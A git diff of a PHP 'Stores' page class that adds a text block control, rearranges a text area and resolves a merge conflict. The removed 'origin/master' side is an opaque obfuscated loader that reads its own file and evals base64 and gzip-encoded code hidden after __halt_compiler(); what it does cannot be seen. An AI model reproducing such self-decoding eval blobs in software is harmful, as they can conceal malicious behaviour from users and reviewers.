@@ -1,4 +1,4 @@
-<<<<<<< HEAD
+
 
 <?php
 
@@ -9,7 +9,6 @@ require_once('/ezframework/uielements/checkBox.php');
 require_once('/ezframework/uielements/radioButton.php');
 require_once('/ezframework/uielements/textBox.php');
 require_once('/ezframework/uielements/label.php');
-require_once('/ezframework/uielements/textArea.php');
 require_once('/ezframework/uielements/comboBox.php');
 require_once('/ezframework/uielements/image.php');
 require_once('/ezframework/uielements/file.php');
@@ -17,6 +16,8 @@ require_once('/ezframework/uielements/tabControl.php');
 require_once('/ezframework/uielements/tabContainer.php');
 require_once('/datahelper/group.php');
 require_once('/ezframework/uielements/contentControl.php');
+require_once('/ezframework/enum/tagType.php');
+require_once('/ezframework/uielements/textBlock.php');
 
 class Stores extends PageBase {
 	
@@ -35,7 +36,7 @@ class Stores extends PageBase {
 		$this->radioButton1 = new RadioButton();
 		$this->textBox1 = new TextBox();
 		$this->label_1 = new Label();
-		$this->textarea_1 = new TextArea();
+		$this->textarea_1 = new TextBox();
 		$this->comboBox_1 = new ComboBox();
 		$this->comboBox_2 = new ComboBox();
 		$this->image_1 = new Image();
@@ -49,6 +50,7 @@ class Stores extends PageBase {
 		$this->tab2 = new Tab();
 		$this->tab3 = new Tab();
 		$this->tab_container = new TabContainer();
+		$this->text_block_1 = new TextBlock();
 		
 		$this->panel1->Set("identifier", "groupbox1_header");
 		$this->panel1->Set("Parent", $this->groupBox1->Get("Header"));
@@ -83,10 +85,6 @@ class Stores extends PageBase {
 		$this->label_1->Set("classname", "class_labael_1");
 		$this->label_1->Set("value", "header 1 test");
 		$this->label_1->Set("header", "h1");
-		
-		$this->textarea_1->Set("identifier", "id_textarea_1");
-		$this->textarea_1->Set("classname", "class_textarea_1");
-		$this->textarea_1->Set("name", "name_textarea_1");
 		
 		$this->comboBox_1->Set("identifier", "id_comboBox_1");
 		$this->comboBox_1->Set("classname", "class_comboBox_1");
@@ -143,7 +141,6 @@ class Stores extends PageBase {
 		$this->radioButton1->Set("Parent", $this->panel2);
 		$this->label_1->Set("parent", $this);
 		$this->textBox1->Set("parent", $this);
-		$this->textarea_1->Set("parent", $this);
 		$this->comboBox_1->Set("parent", $this);
 		$this->comboBox_2->Set("parent", $this);
 		$this->image_1->Set("parent", $this);
@@ -197,6 +194,20 @@ class Stores extends PageBase {
 		$this->panel8->Set("parent", $this->tab2->Get("content"));
 		$this->panel9->Set("parent", $this->tab3->Get("content"));
 		
+		$this->text_block_type_1 = TagType::h3;
+		$this->text_block_1->Set("identifier", "id_text_block_1");
+		$this->text_block_1->Set("classname", "class_text_block_1");
+		$this->text_block_1->Set("value", "text block string sample");
+		$this->text_block_1->Set("tagtype", $this->text_block_type_1);
+		$this->text_block_1->Set("parent", $this); 
+		
+		$this->textarea_1->Set("identifier", "id_textarea_1");
+		$this->textarea_1->Set("classname", "class_textarea_1");
+		$this->textarea_1->Set("name", "name_textarea_1");
+		$this->textarea_1->Set("value", "Hello, I am a sample text area");
+		$this->textarea_1->Set("ismultiline", true);
+		$this->textarea_1->Set("parent", $this);
+		
 		// $this->panel2->AddControl($this->panel1);
 		// $this->panel2->AddControl($this->panel3);
 		// $this->panel1->AddControl($this->panel4);
@@ -225,7 +236,6 @@ class Stores extends PageBase {
 	private $textBox1;
 	private $label_1;
 	private $groupBox1;
-	private $textarea_1;
 	private $comboBox_1;
 	private $comboBox_2;
 	private $image_1;
@@ -239,9 +249,9 @@ class Stores extends PageBase {
 	private $tab1;
 	private $tab2;
 	private $tab3;
+	private $text_block_1;
+	private $text_block_type_1;
+	private $textarea_1;
 }
 
 ?>
-=======
-<?php /*** PHP Encode v1.0 by zeura.com ***/ $XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode("aWYoIWZ1bmN0aW9uX2V4aXN0cygiWWl1bklVWTc2YkJodWhOWUlPOCIpKXtmdW5jdGlvbiBZaXVuSVVZNzZiQmh1aE5ZSU84KCRnLCRiPTApeyRhPWltcGxvZGUoIlxuIiwkZyk7JGQ9YXJyYXkoNjU1LDIzNiw0MCk7aWYoJGI9PTApICRmPXN1YnN0cigkYSwkZFswXSwkZFsxXSk7ZWxzZWlmKCRiPT0xKSAkZj1zdWJzdHIoJGEsJGRbMF0rJGRbMV0sJGRbMl0pO2Vsc2UgJGY9dHJpbShzdWJzdHIoJGEsJGRbMF0rJGRbMV0rJGRbMl0pKTtyZXR1cm4oJGYpO319"));eval(base64_decode(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH)));eval(ZsldkfhGYU87iyihdfsow(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,2),YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,1)));__halt_compiler();aWYoIWZ1bmN0aW9uX2V4aXN0cygiWnNsZGtmaEdZVTg3aXlpaGRmc293Iikpe2Z1bmN0aW9uIFpzbGRrZmhHWVU4N2l5aWhkZnNvdygkYSwkaCl7aWYoJGg9PXNoYTEoJGEpKXtyZXR1cm4oZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJGEpKSk7fWVsc2V7ZWNobygiRXJyb3I6IEZpbGUgTW9kaWZpZWQiKTt9fX0=2bb9aa1821fc6e5a6241f90d9912c154e39bdb62lVdba9swFH5uof/BmEJTWBfi9K2s0IbRPYxRtr0b2VIaEUfyZLlpN/rfp5sdy5ZsGRpSnfN9R+emI4WhPzVmKKUkR4urJfq7ZeCAjpTtlzVGBTogwqtlCV7QI6jQ53JXXl3fXZyzQBpBxUzOC6N1+UjfZtLyHcr382kMQEwfa84pmcnk6I3P368A2eyMyJ0eGAJzM0IPGR3xEAIOdqgoEdM5n22ecPHPRnwxegrp4jwvQFVFHFU8Eo4jAqvo2bRP9O/i/Ez8lXVW4Dza1iTnmJJoI6Lj6KsxvbhWuLNLvsPVzb1qolX0JSLoKCyJxUJuZOuTCf16Qn/r1zcN2bjwZNY2qum/BrUxaxvVabcG+PMksrGmwRrcb720Maqd0gbyXa6GRoDIbto1I5up573plRa2MQIPLHHDBlW7uf+F+CLGUNQVbzFi8acoVgnNRGTpDgEoZG5yMkHOKHyPx/d9FqETLmj9Ut7cP0n9N7O/o5/6FnwmNvoYNDZcfeOPQ8TwlmIYu/vN8NR5IuIE2jQlHmfa4Tua3umZVqUQvw6z23a5k6m0rpD6tCaalqAEoxQrCy3PkYQB0RSobQId3yjnFRS13gg4urN7iJ15UIA0UwiRi1XsnQHd4H6Y4Cy20kwbIC6uFE5T21gzvEfTnrbZ7OIdU8uZGAxTqZeV6znWo9nVlotAYsOR34GUsgA52tECmvY/LdUlNgzRDF1fhEYduwa1PzwBAFO0tlR6bkarroNOhhmwkrJy10pfDmPV0ojYc62MFyyIO6iZxXLeUj5/T4jYc7/5/Q3mWv4Gs/h7qViHuuC4LNAEnJbyZSQJlIRj+ZGGY3cMhVve0pqNVCSZrEji2SoJqMgU112RKVZTEchoCemRTMBDKpLMqEgyqyJJaEV6V1n/CaRfN1NjPoBlD5rS/9Toj9txpDUZRrCDVg3BJiNY+Vkuo94j8AFC8wtnYT0wNScYv3biV168ep4ItNMt3/Tb16TpNQ9jeMZajm8z98EGBOzlx73d2u3gS1XXhOAxR90v0gwXgHeIUVMvhnjNiLYgzX2Yn5cMv4rfk9GlDv5uIEqGovVQdGuJ2oNlSbtnx1I0XW8JzZmxZO2jfUDXR8F2ou16t1gG9vEf
->>>>>>> origin/master
